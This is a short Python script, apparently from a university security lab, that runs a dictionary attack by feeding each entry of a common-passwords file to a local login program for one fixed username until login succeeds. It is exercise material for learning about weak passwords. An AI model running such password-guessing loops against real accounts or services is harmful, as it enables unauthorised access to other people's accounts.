import subprocess, time

print(f'Start time: {time.time()}')

# Path to the password file
file_path = '/home/cse/Lab1/Q1'

#Username to be used for the password cracking
username = 'SkyRedFalcon914'

#Open password file and save passwords in a list
with open(f'{file_path}/MostCommonPWs', 'r') as f:
    passwords = f.readlines()

#strip whitespace characters from each password
passwords = [password.strip() for password in passwords]


#Loop through each password and attempt login
for password in passwords:
    #use subproccess to run to attempt login from file Logic.pyc from the same directory
    result = subprocess.run(['python3', 'Login.pyc', username, password], capture_output = True, text = True)

    #Check if the login was successful
    if 'Login successful' in result.stdout:
        print(f'Password found: {password}')
        break

print(f'End time: {time.time()}')

